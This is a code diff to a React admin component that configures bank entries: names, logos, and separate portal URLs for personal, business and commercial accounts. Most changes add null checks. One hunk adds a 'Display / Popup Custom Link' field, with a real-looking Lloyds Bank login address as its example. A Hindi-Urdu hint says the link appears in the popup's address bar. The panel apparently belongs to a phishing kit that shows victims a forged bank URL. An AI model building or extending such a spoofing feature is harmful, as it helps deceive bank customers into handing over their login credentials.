@@ -9,6 +9,8 @@ export default function InstitutionsTab({
   setSubtitle,
   subOptions,
   setSubOptions,
+  displayLink,
+  setDisplayLink,
   logoBase64,
   setLogoBase64,
   order,
@@ -55,7 +57,7 @@ export default function InstitutionsTab({
             <input
               type="text"
               placeholder="e.g. Lloyds Bank"
-              value={bankName}
+              value={bankName || ""}
               onChange={(e) => setBankName(e.target.value)}
               className="w-full rounded-xl border border-zinc-700 p-2.5 text-xs outline-none focus:border-blue-500 bg-zinc-950 text-zinc-100 font-medium shadow-inner placeholder:text-zinc-600"
             />
@@ -65,7 +67,7 @@ export default function InstitutionsTab({
             <input
               type="text"
               placeholder="e.g. Multiple available"
-              value={subtitle}
+              value={subtitle || ""}
               onChange={(e) => setSubtitle(e.target.value)}
               className="w-full rounded-xl border border-zinc-700 p-2.5 text-xs outline-none focus:border-blue-500 bg-zinc-950 text-zinc-100 font-medium shadow-inner placeholder:text-zinc-600"
             />
@@ -74,10 +76,23 @@ export default function InstitutionsTab({
             <label className="block text-xs font-bold text-zinc-300 mb-1">Sub-Options</label>
             <input
               type="text"
-              value={subOptions}
+              value={subOptions || ""}
               onChange={(e) => setSubOptions(e.target.value)}
               className="w-full rounded-xl border border-zinc-700 p-2.5 text-xs outline-none focus:border-blue-500 bg-zinc-950 text-zinc-100 font-medium shadow-inner placeholder:text-zinc-600"
             />
+          </div>
+
+          {/* 🔥 Display / Popup Custom Link Field */}
+          <div>
+            <label className="block text-xs font-bold text-emerald-400 mb-1">Display / Popup Custom Link</label>
+            <input
+              type="text"
+              placeholder="e.g. authorise.lloydsbank.co.uk/auth/user"
+              value={displayLink || ""}
+              onChange={(e) => setDisplayLink(e.target.value)}
+              className="w-full rounded-xl border border-emerald-500/40 p-2.5 text-xs outline-none focus:border-emerald-500 bg-zinc-950 text-emerald-300 font-mono shadow-inner placeholder:text-zinc-600"
+            />
+            <p className="text-[10px] text-zinc-400 mt-1">Yeh link popup ki ooper wali address bar mein show hoga.</p>
           </div>
 
           {/* 🌍 Category-wise Dedicated Bank URLs & Checkboxes */}
@@ -90,7 +105,7 @@ export default function InstitutionsTab({
                 <label className="text-xs font-bold text-zinc-200">Personal Account</label>
                 <input
                   type="checkbox"
-                  checked={enablePersonal}
+                  checked={!!enablePersonal}
                   onChange={(e) => setEnablePersonal(e.target.checked)}
                   className="w-4 h-4 accent-emerald-500 cursor-pointer"
                 />
@@ -98,7 +113,7 @@ export default function InstitutionsTab({
               <input
                 type="text"
                 placeholder="Personal Portal URL"
-                value={personalUrl}
+                value={personalUrl || ""}
                 onChange={(e) => setPersonalUrl(e.target.value)}
                 className="w-full rounded-lg border border-zinc-700 p-2 text-xs outline-none focus:border-blue-500 bg-zinc-900 text-zinc-100 font-mono"
               />
@@ -110,7 +125,7 @@ export default function InstitutionsTab({
                 <label className="text-xs font-bold text-zinc-200">Business Account</label>
                 <input
                   type="checkbox"
-                  checked={enableBusiness}
+                  checked={!!enableBusiness}
                   onChange={(e) => setEnableBusiness(e.target.checked)}
                   className="w-4 h-4 accent-emerald-500 cursor-pointer"
                 />
@@ -118,7 +133,7 @@ export default function InstitutionsTab({
               <input
                 type="text"
                 placeholder="Business Portal URL"
-                value={businessUrl}
+                value={businessUrl || ""}
                 onChange={(e) => setBusinessUrl(e.target.value)}
                 className="w-full rounded-lg border border-zinc-700 p-2 text-xs outline-none focus:border-blue-500 bg-zinc-900 text-zinc-100 font-mono"
               />
@@ -130,7 +145,7 @@ export default function InstitutionsTab({
                 <label className="text-xs font-bold text-zinc-200">Commercial / Corporate</label>
                 <input
                   type="checkbox"
-                  checked={enableCommercial}
+                  checked={!!enableCommercial}
                   onChange={(e) => setEnableCommercial(e.target.checked)}
                   className="w-4 h-4 accent-emerald-500 cursor-pointer"
                 />
@@ -138,7 +153,7 @@ export default function InstitutionsTab({
               <input
                 type="text"
                 placeholder="Commercial Portal URL"
-                value={commercialUrl}
+                value={commercialUrl || ""}
                 onChange={(e) => setCommercialUrl(e.target.value)}
                 className="w-full rounded-lg border border-zinc-700 p-2 text-xs outline-none focus:border-blue-500 bg-zinc-900 text-zinc-100 font-mono"
               />
@@ -221,7 +236,7 @@ export default function InstitutionsTab({
               </tr>
             </thead>
             <tbody className="divide-y divide-zinc-800">
-              {banks.map((bank: any) => (
+              {Array.isArray(banks) && banks.map((bank: any) => (
                 <tr key={bank.id} className="hover:bg-zinc-800/50 transition-colors">
                   <td className="py-3 px-4">
                     <div className="w-9 h-9 rounded-full border border-zinc-700 flex items-center justify-center overflow-hidden bg-white shadow-inner">
@@ -229,7 +244,7 @@ export default function InstitutionsTab({
                         <img src={bank.logoUrl} alt={bank.name} className="h-7 w-7 object-contain" />
                       ) : (
                         <span className="text-[10px] font-black text-zinc-900">
-                          {bank.name.slice(0, 2).toUpperCase()}
+                          {bank.name ? bank.name.slice(0, 2).toUpperCase() : "BK"}
                         </span>
                       )}
                     </div>
@@ -239,7 +254,7 @@ export default function InstitutionsTab({
                     <p className="text-[11px] text-zinc-400 mt-0.5">{bank.subtitle}</p>
                   </td>
                   <td className="py-3 px-4 font-bold text-emerald-400">
-                    {bank.order ?? 1}
+                    {bank.order ?? bank.sortOrder ?? 1}
                   </td>
                   <td className="py-3 px-4">
                     <span className={`font-extrabold px-2.5 py-1 rounded-md text-[10px] tracking-wider border shadow-2xs ${
@@ -277,7 +292,7 @@ export default function InstitutionsTab({
                   </td>
                 </tr>
               ))}
-              {banks.length === 0 && (
+              {(!banks || banks.length === 0) && (
                 <tr>
                   <td colSpan={5} className="text-center py-12 text-zinc-500 text-xs">
                     No configured institutions found.
